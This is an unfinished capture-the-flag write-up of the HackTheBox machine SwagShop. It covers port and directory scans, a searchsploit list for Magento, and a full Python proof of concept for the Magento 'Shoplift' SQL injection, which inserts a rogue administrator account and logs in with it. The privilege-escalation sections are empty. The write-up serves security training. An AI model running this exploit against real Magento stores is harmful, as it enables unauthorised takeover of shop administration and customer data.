---
description: 12/05/2023
---

# SwagShop (Easy)

<figure><img src="../../../.gitbook/assets/SwagShop.png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6552bd24e8fa3817261379a12f624ec (RSA)
|   256 2e30007a92f0893059c17756ad51c0ba (ECDSA)
|_  256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
|_http-title: Home page
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 22:57
Completed NSE at 22:57, 0.00s elapsed
Initiating NSE at 22:57
Completed NSE at 22:57, 0.00s elapsed
Initiating NSE at 22:57
Completed NSE at 22:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.16 seconds
           Raw packets sent: 66636 (2.932MB) | Rcvd: 79440 (5.825MB)
```

Enumerated UDP ports:

```
```

Notes:

Added our IP address to the box in `/etc/hosts` with the hostname of `swagshop.htb`.

<mark style="color:green;">**Port 22**</mark>: SSH, standard, not much to see here

<mark style="color:green;">**Port 80**</mark>: Apache httpd 2.4.29 (Ubuntu)

## Enumeration

### Port 80 - HTTP (Apache)

<mark style="color:yellow;">**Magento**</mark> is  running here; an enormous open source e-commerce platform powered by PHP.

Unable to find a version number, but I was able to find a copyright date of 2014 pertaining to Magento.

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Clearly seeing that this version of Magento is quite old; perhaps some exploits could exist?</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Dirsearch

```
Target: http://swagshop.htb/

[22:56:27] Starting: 
[22:56:28] 301 -  309B  - /js  ->  http://swagshop.htb/js/
[22:56:30] 403 -  277B  - /.ht_wsr.txt
[22:56:30] 403 -  277B  - /.htaccess.bak1
[22:56:30] 403 -  277B  - /.htaccess.orig
[22:56:30] 403 -  277B  - /.htaccess.sample
[22:56:30] 403 -  277B  - /.htaccess.save
[22:56:30] 403 -  277B  - /.htaccess_extra
[22:56:30] 403 -  277B  - /.htaccess_sc
[22:56:30] 403 -  277B  - /.htaccess_orig
[22:56:30] 403 -  277B  - /.htaccessOLD
[22:56:30] 403 -  277B  - /.htaccessBAK
[22:56:30] 403 -  277B  - /.htaccessOLD2
[22:56:30] 403 -  277B  - /.htm
[22:56:30] 403 -  277B  - /.html
[22:56:30] 403 -  277B  - /.htpasswds
[22:56:30] 403 -  277B  - /.httr-oauth
[22:56:30] 403 -  277B  - /.htpasswd_test
[22:56:31] 403 -  277B  - /.php
[22:56:31] 403 -  277B  - /.php3
[22:56:40] 200 -   37B  - /api.php
[22:56:40] 301 -  310B  - /app  ->  http://swagshop.htb/app/
[22:56:40] 200 -  525B  - /app/
[22:56:40] 200 -    1KB - /app/etc/config.xml
[22:56:40] 200 -  998B  - /app/etc/local.xml
[22:56:40] 200 -    3KB - /app/etc/local.xml.additional
[22:56:40] 200 -  895B  - /app/etc/local.xml.template
[22:56:45] 200 -  717B  - /cron.sh
[22:56:45] 200 -    0B  - /cron.php
[22:56:47] 301 -  313B  - /errors  ->  http://swagshop.htb/errors/
[22:56:47] 200 -  574B  - /errors/
[22:56:47] 200 -    1KB - /favicon.ico
[22:56:48] 404 -    0B  - /get.php
[22:56:49] 301 -  315B  - /includes  ->  http://swagshop.htb/includes/
[22:56:49] 200 -  458B  - /includes/
[22:56:50] 404 -   14KB - /index.php/login/
[22:56:50] 200 -   44B  - /install.php
[22:56:50] 200 -   44B  - /install.php?profile=default
[22:56:50] 404 -   52B  - /js/
[22:56:51] 301 -  318B  - /js/tiny_mce  ->  http://swagshop.htb/js/tiny_mce/
[22:56:51] 200 -  701B  - /js/tiny_mce/
[22:56:51] 301 -  310B  - /lib  ->  http://swagshop.htb/lib/
[22:56:51] 200 -  554B  - /lib/
[22:56:51] 200 -    4KB - /LICENSE.txt
[22:56:53] 301 -  312B  - /media  ->  http://swagshop.htb/media/
[22:56:53] 200 -  505B  - /media/
[22:56:59] 200 -  886B  - /php.ini.sample
[22:57:01] 301 -  314B  - /pkginfo  ->  http://swagshop.htb/pkginfo/
[22:57:03] 200 -  571KB - /RELEASE_NOTES.txt
[22:57:04] 403 -  277B  - /server-status/
[22:57:04] 403 -  277B  - /server-status
[22:57:04] 301 -  312B  - /shell  ->  http://swagshop.htb/shell/
[22:57:04] 200 -  504B  - /shell/
[22:57:05] 301 -  311B  - /skin  ->  http://swagshop.htb/skin/
[22:57:10] 301 -  310B  - /var  ->  http://swagshop.htb/var/
[22:57:10] 200 -  409B  - /var/backups/
[22:57:10] 200 -  579B  - /var/
[22:57:10] 200 -  574B  - /var/cache/
[22:57:10] 200 -    1KB - /var/package/

Task Completed
```

#### Searchsploit (Magento)

{% code fullWidth="false" %}
```
searchsploit magento 
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                               | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                                    | php/webapps/38651.txt
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                                         | php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                                                   | php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                                                  | php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                             | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                               | php/webapps/37811.py
Magento eCommerce - Local File Disclosure                                                                                                                  | php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                                                                  | xml/webapps/37977.py
Magento eCommerce CE v2.3.5-p2 - Blind SQLi                                                                                                                | php/webapps/50896.txt
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                                     | php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                                | php/webapps/35052.txt
Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                                               | php/webapps/48135.php
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
{% endcode %}



Unfortunately, these ended up being rabbit holes. I believe a vulnerability exists in the Magento login page from the outdated 2014 information disclosure that the site had provided us and from the `searchsploit` output.

**This can be found here:**&#x20;

```
http://swagshop.htb/index.php/customer/account/login/
```

#### Exploit definitely worth checking out:

{% embed url="https://github.com/ambionics/magento-exploits/blob/master/magento-sqli.py" %}

## Exploitation

### Unauthenticated SQLi Against Magento

{% embed url="https://raw.githubusercontent.com/joren485/Magento-Shoplift-SQLI/master/poc.py" %}

#### `poc.py`:

```python
import requests
import base64
import sys

target = sys.argv[1]

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

# For demo purposes, I use the same attack as is being used in the wild
SQLQUERY="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""

# Put the nice readable queries into one line,
# and insert the username:password combinination
query = SQLQUERY.replace("\n", "").format(username="hacker", password="hacker")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url, 
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds hacker:hacker".format(target)
else:
    print "DID NOT WORK"

```

### Result

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Created an account with administrator-level permissions</p></figcaption></figure>

**Upon navigating to the administrative portal, we login with our new credentials of&#x20;**<mark style="color:green;">**hacker:hacker**</mark>**, and we are granted with the following page:**&#x20;

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Gained access to the Magento Administrative Portal</p></figcaption></figure>

Next steps will involve finding an authenticated code execution vulnerability in which we can execute to gain a shell on the target box.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Using information that we had obtained from `http://swagshop.htb/RELEASE_NOTES.txt`, we were able to depict that <mark style="color:yellow;">we are running at least Magento version 1.7.0.2. Meaning the exploit above should work with our newly authenticated account</mark>.

## Privilege Escalation

### Local enumeration

### PrivEsc vector

## Proofs
